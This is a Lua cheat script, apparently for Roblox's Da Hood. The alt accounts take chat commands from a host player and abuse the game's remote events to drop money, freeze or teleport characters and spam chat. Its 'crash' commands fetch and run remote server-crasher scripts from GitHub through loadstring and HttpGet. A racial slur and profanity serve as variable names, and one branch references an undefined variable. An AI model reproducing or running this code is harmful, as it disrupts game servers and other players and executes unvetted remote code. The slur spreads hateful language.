local args = {
[1] = "loaded, prefix is ".."'"..Prefix.."'",--If u really change this ur very down bad 
[2] = "All"
    }
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))   

local nou = game.Players[Host]
local char = game.Players.LocalPlayer.Character
local plr = game.Players.LocalPlayer
nou.Chatted:connect(function(msg)
local spt = msg:split(' ')
if msg == Prefix.."drop" then
	game.ReplicatedStorage.MainEvent:FireServer("Block", true, 1, 8) 
_G.Autodrop =true
elseif msg == Prefix.."stop" then
game.ReplicatedStorage.MainEvent:FireServer("Block", false, 1, 8) 
_G.Autodrop = false    
elseif msg == Prefix.."setup admin" then 
elseif msg == Prefix.."setup bank" then 
elseif msg == Prefix.."setup train" then 
elseif msg == Prefix.."setup club" then         
elseif msg == Prefix.."warp" then
char.HumanoidRootPart.CFrame = nou.Character.HumanoidRootPart.CFrame
char.HumanoidRootPart.Anchored = false
elseif msg == Prefix.."warp true" then
if plr.Name ~= Host then    
char.HumanoidRootPart.CFrame = nou.Character.HumanoidRootPart.CFrame
wait(1)
char.Humanoid.Jump = true
wait(0.2)
char.HumanoidRootPart.Anchored = true
end
elseif msg == Prefix.."" then --bringscript
elseif msg == Prefix.."airlock" then   
if plr.Name ~= Host then
char.Humanoid.Jump = true
wait(0.2)
char.HumanoidRootPart.Anchored = true
end  
elseif msg == Prefix.."unlock" then       
char.HumanoidRootPart.Anchored = false
elseif msg == Prefix.."freeze" then  
if plr.Name ~= Host then    
char.HumanoidRootPart.Anchored = true    
end
elseif msg:sub(1, 10) == Prefix.."dropuntil" then
if plr.Name ~= Host then    
local mula = msg:match("%d+")
Bitchnigga = mula
print(Bitchnigga)
repeat
wait()
game.ReplicatedStorage.MainEvent:FireServer("Block", true, 1, 8) 
game.ReplicatedStorage.MainEvent:FireServer('DropMoney','10000')
local cah = Workspace.Ignored.Drop
local e = 0
for i, dick in pairs(cah:GetDescendants()) do
if dick.Name == "TextLabel" then
local sign = string.split(dick.Text, "$")[2]
local amt if string.match(sign,",") then 
amt =new:gsub("%,","") 
else
amt = sign + 0
end
sign = amt 
sign = tonumber(sign)
e = e + sign 
end 
end 
local function numform(num2) num2 = tostring(num2) return num2:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "") 
end
until
e > Bitchnigga
if e > Bitchnigga then
print("Done")
end
end	
elseif msg == Prefix.."unfreeze" then 
char.HumanoidRootPart.Anchored = false
elseif msg == Prefix.."close" then
game:Shutdown()
elseif msg == Prefix.."advert on" then
_G.advert = true
elseif msg == Prefix.."advert off" then
_G.advert = false
elseif msg == Prefix.."loopdestroy on" then
for i,v in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
if v.Name == "MoneyDrop" then
v:Destroy() 
end
end
_G.LD = true
elseif msg == Prefix.."loopdestroy off" then
_G.LD = false
elseif msg == Prefix.."money show" then
if game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet") then
game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet").Parent = game.Players.LocalPlayer.Character
end
elseif msg == Prefix.."money hide" then
if game.Players.LocalPlayer.Character:FindFirstChild("Wallet") then
game.Players.LocalPlayer.Character:FindFirstChild("Wallet").Parent = game.Players.LocalPlayer.Backpack
end
elseif spt[1] == Prefix.."say" and spt[2] then
local args = {
[1] = spt[2],
[2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
elseif spt[1] == Prefix.."fps" and spt[2] then
setfpscap(spt[2])  --If dont work use tostring(spt[2])  
elseif msg == Prefix.."crash encrypt" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua'))()    --I did not make this discord.gg/encrypt did
elseif msg == Prefix.."crash swag" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))() -- I did not make this LERK#7643 did
elseif msg == Prefix.."reset" then
plr.Character:FindFirstChild("FULLY_LOADED_CHAR").Parent = game.ReplicatedStorage
plr.Character:Remove()
plr.ReplicatedStorage:FindFirstChild("FULLY_LOADED_CHAR").Parent = LP.Character
elseif msg == Prefix.."test" then
local args = {
[1] = "Test Passed",
[2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
elseif msg == Prefix.."credits" then
local args = {
[1] = "Iku warcok remade by No U 6734",--If u really change this ur very down bad 
[2] = "All"
    }
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))   
setclipboard("No U#6734")
end
end)
game.Workspace.Ignored.Drop.ChildAdded:Connect(function(lol)
    if _G.LD == true then
    wait(0.5)
lol:Destroy()
    end
end)
spawn(function()
while wait() do
if _G.Autodrop == true then
game.ReplicatedStorage.MainEvent:FireServer('DropMoney','10000')
end
end
end)    
spawn(function()
while wait(14) do
if _G.advert == true then
local args = {
[1] = AdvertMsg,
[2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end
end
end)  
--3DRendering False
if plr.Name ~= Host then
game:GetService("RunService"):Set3dRenderingEnabled(false)
setfpscap(FPS)
end